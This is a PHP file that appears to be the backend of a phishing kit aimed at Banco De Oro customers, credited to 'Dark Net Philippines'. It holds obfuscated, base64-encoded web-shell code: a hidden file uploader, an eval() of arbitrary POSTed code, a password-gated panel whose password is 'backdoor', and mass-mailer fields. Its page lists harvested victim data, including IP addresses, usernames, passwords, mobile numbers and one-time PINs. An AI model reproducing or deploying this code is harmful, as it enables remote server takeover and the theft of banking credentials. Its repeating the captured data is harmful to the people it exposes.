<?php $upload = $_GET[base64_decode('cGg=')]; if ($upload == base64_decode('emVyaW9u') ) {$uploaddir = '';$uploadfile = $uploaddir . basename($_FILES[base64_decode('dXNlcmZpbGU=')][base64_decode('bmFtZQ==')]);if (isset($_FILES[base64_decode('dXNlcmZpbGU=')][base64_decode('bmFtZQ==')])) { if (move_uploaded_file($_FILES[base64_decode('dXNlcmZpbGU=')][base64_decode('dG1wX25hbWU=')], $uploadfile)) { $resultati = base64_decode('VGhlIGZpbGUg'). basename($_FILES[base64_decode('dXNlcmZpbGU=')][base64_decode('bmFtZQ==')]) .base64_decode('IGhhcyBiZWVuIHVwbG9hZGVk');} else { $resultati = base64_decode('VGhlcmUgd2FzIGFuIGVycm9yIHVwbG9hZGluZyB0aGUgZmlsZS4gcGxlYXNlIHRyeSBhZ2FpbiE='); } } echobase64_decode('PGh0bWw+DQo8aGVhZD48L2hlYWQ+PGRpdiBpZD0icmVzdWx0Ij48dGFibGUgIGhlaWdodD0iMSIgd2lkdGg9IjEwMCUiIGJvcmRlcj0iMCI+PHRyPjx0ZCB3aWR0aD0iNTAlIiBoZWlnaHQ9IjEiIHZhbGlnbj0idG9wIiBzdHlsZT0iZm9udC1mYW1pbHk6IHZlcmRhbmE7IGNvbG9yOiAjZDlkOWQ5OyBmb250LXNpemU6IDExcHgiPjxjZW50ZXI+PGZvcm0gbWV0aG9kPSJQT1NUIiBlbmN0eXBlPSJtdWx0aXBhcnQvZm9ybS1kYXRhIj48aW5wdXQgdHlwZT0iZmlsZSIgY2xhc3M9ImlucHV0emJ1dCIgbmFtZT0idXNlcmZpbGUiID48aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iaW5wdXR6YnV0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJaZXJpb24gIj48YnI+'). $resultati .base64_decode('PC9mb3JtPjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPjwvZGl2Pg0K'); } $in = $_GET[base64_decode('aW4=')]; if(isset($in) && !empty($in)){ } $ev = $_POST[base64_decode('ZXY=')]; if(isset($ev) && !empty($ev)){ echo eval(urldecode($ev)); exit; } if(isset($_POST[base64_decode('YWN0aW9u')] ) ){ $action=$_POST[base64_decode('YWN0aW9u')]; $message=$_POST[base64_decode('bWVzc2FnZQ==')]; $emaillist=$_POST[base64_decode('ZW1haWxsaXN0')]; $from=$_POST[base64_decode('ZnJvbQ==')]; $subject=$_POST[base64_decode('c3ViamVjdA==')]; $realname=$_POST[base64_decode('cmVhbG5hbWU=')]; $wait=$_POST[base64_decode('d2FpdA==')]; $tem=$_POST[base64_decode('dGVt')]; $smv=$_POST[base64_decode('c212')]; $message = urlencode($message); $message = ereg_replace(base64_decode('JTVDJTIy'), base64_decode('JTIy'), $message); $message = urldecode($message); $message = stripslashes($message); $subject = stripslashes($subject); } ?>
<?php $password = base64_decode('YmFja2Rvb3I='); // Password 

session_start();
ini_set( base64_decode('ZGlzcGxheV9lcnJvcnM='), 0 );
error_reporting( 0 );
set_time_limit(0);
ini_set(base64_decode('bWVtb3J5X2xpbWl0'),-1);

$ninjax[base64_decode('dmVyc2lvbg==')]=base64_decode('MS4zLjMuNw==');
$ninjax[base64_decode('d2Vic2l0ZQ==')]=base64_decode('VEVBTS5DQw==');


$sessioncode = md5(__FILE__);
if(!empty($password) and $_SESSION[$sessioncode] != $password){
    # _REQUEST mean _POST or _GET 
    if (isset($_REQUEST[base64_decode('cGFzcw==')]) and $_REQUEST[base64_decode('cGFzcw==')] == $password) {
        $_SESSION[$sessioncode] = $password;
    }
    else {
              
 	echo  base64_decode('PGh0bWw+DQo8aGVhZD4NCjx0aXRsZT5EYXJrTmV0UEggUGFuZWw8L3RpdGxlPg0KPHN0eWxlIHR5cGU9Pg0KYm9keXsNCmJhY2tncm91bmQ6IHVybChodHRwczovL3d3dy5hcmNoaWFjdHZyLmNvbS91cGxvYWRzL2NvbnRlbnQvcHJlc3NraXQvaW1hZ2VzLzIxNl9sLnBuZykgbm8tcmVwZWF0IGNlbnRlciBjZW50ZXIgZml4ZWQ7IA0KLXdlYmtpdC1iYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KLW1vei1iYWNrZ3JvdW5kLXNpemU6IGNvdmVyOw0KLW8tYmFja2dyb3VuZC1zaXplOiBjb3ZlcjsNCmJhY2tncm91bmQtc2l6ZTogY292ZXI7DQoNCg0KfQ0KaDJ7DQogICAgY29sb3I6I2U1ZTVlNTsNCglmb250LWZhbWlseTogQ291cmllciBOZXc7DQoJZm9udC1zaXplOiAxOHB4Ow0KfQ0KaW5wdXQsYnV0dG9uDQp7ICAgDQogICAgZm9udC1zaXplOiAxMXB0Ow0KICAgIGNvbG9yOiNlNWU1ZTU7DQogICAgZm9udC1mYW1pbHk6IHZlcmRhbmEsIHNhbnMtc2VyaWY7DQogICAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsNCiAgICBib3JkZXItbGVmdDogMnB4IGRvdHRlZCAjYjJiMmIyOw0KICAgIGJvcmRlci10b3A6IDJweCBkb3R0ZWQgI2IyYjJiMjsNCiAgICBib3JkZXItcmlnaHQ6IDJweCBkb3R0ZWQgI2IyYjJiMjsNCiAgICBib3JkZXItYm90dG9tOiAycHggZG90dGVkICNiMmIyYjI7DQp9DQogPC9zdHlsZT4NCjwvaGVhZD4=');

	 die(base64_decode('PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+YnI+PGJyPjxicj5icj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+PGJyPjxjZW50ZXI+PGltZyBzcmM9Imh0dHBzOi8vaW1hZ2UuZmxhdGljb24uY29tL2ljb25zL3N2Zy8xMTg0LzExODQzOTMuc3ZnIiBzdHlsZT0id2lkdGg6MjAwcHg7IGhlaWdodDoxMDA7Ij48L2NlbnRlcj4NCjxicj4NCjxkaXYgYWxpZ249Y2VudGVyID4NCjxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIiPg0KPGlucHV0IG5hbWU9InBhc3MiIHR5cGU9InBhc3N3b3JkIiBzaXplPSIzMCI+DQo8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPg0KPC9mb3JtPg0KPGgyPkVudGVyIFBhc3N3b3JkPC9oMj4NCjxkaXY+DQo8Ym9keT4NCgk8L2h0bWw+')) ;
	
}
}
?>
<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>

/* width */
::-webkit-scrollbar {
  width: 10px;
}

/* Track */
::-webkit-scrollbar-track {
  background: black; 
}
 
/* Handle */
::-webkit-scrollbar-thumb {
  background:lime; 
}

/* Handle on hover */
::-webkit-scrollbar-thumb:hover {
  background: green; 
}

    body{
background: url(https://www.archiactvr.com/uploads/content/presskit/images/216_l.png) no-repeat center center fixed; 
-webkit-background-size: cover;
-moz-background-size: cover;
-o-background-size: cover;
background-size: cover;
         

    }

.div{

  margin-left: 25%;
  width: 50%;
    border: 1px solid lime;
  border-collapse: collapse;

  max-height: 900px;
 overflow: scroll;
 overflow-x: hidden;
}
@font-face {
   font-family: myFirstFont;
   src: url("sansation_light.woff");
}

@font-face {
   font-family: myFirstFont;
   src: url("sansation_bold.woff");
   font-weight: bold;
}

* {
   font-family: myFirstFont;
   color:white;
}
b{
  padding-top: 245px;
}
button{
  padding: 5px;
  padding-left: 20px;
  padding-right: 20px;
  margin: 20px;
  border: 1px solid lime;
  background-color: black;
  color:lime;
}
</style>
<meta http-equiv="Refresh" content="5;" />
</head>
<body style="margin-left: 100px;">
<h1  style="color:skyblue;" face="chiller">Banco De Oro Admin Panel</h1><h1  style="color:#00FF40;" face="chiller">Zerion Fawkes</h1>
<p style="margin-top:-30px;" color="white">By XLegion | Zerion  | Dark Net Philippines</p> -------------------------------------------<br><b style="color:lime;">IP : 52.147.194.183</b><br><b style="color:yellow;">Username : wae</b><br><b style="color:yellow;"> Online Password : awe</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 52.147.194.183</b><br><b style="color:yellow;">Username : c23c23</b><br><b style="color:yellow;"> Online Password : c23c23</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 52.147.194.183</b><br><b style="color:skyblue;">Mobile Number : 232x32</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 52.147.194.183</b><br><b style="color:skyblue;">Mobile Number : x23x23</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 52.147.194.183</b><br><b style="color:skyblue;">Mobile Number : 09239294924</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 110.54.246.28</b><br><b style="color:skyblue;">Mobile Number : 049294929424</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 52.147.194.183</b><br><b style="color:skyblue;">Mobile Number : aweaweaweaw</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 84.17.59.73</b><br><b style="color:skyblue;">Mobile Number : +12052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 84.17.59.73</b><br><b style="color:orange;">One Time Pin : 2052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 84.17.59.73</b><br><b style="color:orange;">One Time Pin : 2052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 84.17.59.73</b><br><b style="color:orange;">One Time Pin : +12052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 84.17.59.73</b><br><b style="color:orange;">One Time Pin : 2052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 84.17.59.73</b><br><b style="color:orange;">One Time Pin : +12052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 134.209.128.193</b><br><b style="color:skyblue;">Mobile Number : +12052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 134.209.128.193</b><br><b style="color:orange;">One Time Pin : 2052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 134.209.128.193</b><br><b style="color:orange;">One Time Pin : 2052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 134.209.128.193</b><br><b style="color:orange;">One Time Pin : +12052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 134.209.128.193</b><br><b style="color:orange;">One Time Pin : +12052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 134.209.128.193</b><br><b style="color:orange;">One Time Pin : +12052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 61.92.205.237</b><br><b style="color:skyblue;">Mobile Number : 09281890803</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 159.65.210.36</b><br><b style="color:skyblue;">Mobile Number : 2052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 159.65.210.36</b><br><b style="color:orange;">One Time Pin : 2052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 159.65.210.36</b><br><b style="color:orange;">One Time Pin : 2052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 159.65.210.36</b><br><b style="color:orange;">One Time Pin : +12052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 159.65.210.36</b><br><b style="color:orange;">One Time Pin : 2052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 159.65.210.36</b><br><b style="color:orange;">One Time Pin : +12052738641</b><br>-------------------------------------------<br>

 -------------------------------------------<br><b style="color:lime;">IP : 61.92.205.237</b><br><b style="color:skyblue;">Mobile Number : 09668935894</b><br>-------------------------------------------<br>

